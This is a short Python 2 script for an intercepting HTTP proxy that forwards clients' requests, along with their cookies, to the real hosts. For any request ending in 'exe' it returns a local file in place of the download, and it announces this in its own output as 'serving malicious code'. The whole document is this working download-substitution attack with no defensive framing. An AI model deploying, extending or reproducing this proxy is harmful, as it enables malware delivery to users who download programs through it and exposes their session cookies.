import SocketServer
import SimpleHTTPServer
import urllib, urllib2
import re
import os

PORT = 8080

class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):
	error_message_format = ""
	def send_error(self, code, message):
		return False
	def do_GET(self):
		if self.path[len(self.path)-3:] == "exe":
			malfile = open("test.txt", "r")
			print "serving malicious code"
			self.wfile.write(malfile.read())
		else:
			opener = urllib2.build_opener()
			urlhdr = [("user-agent", self.headers.get("user-agent")), ("cookie", self.headers.get("cookie"))]
			opener.addheaders = urlhdr
			urlhandle = opener.open("http://" + self.headers.get("host") + self.path)
			self.wfile.write(urlhandle.read())
		return SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
	def do_POST(self):
		urlhdr = {}
		for item in self.headers:
			urlhdr[item] = self.headers.get(item)
		urlhandle = urllib.urlopen(self.path)#, urllib.urlencode(urlhdr))
		self.wfile.write(urlhandle.read())


httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)
print "serving at port", PORT
httpd.serve_forever()
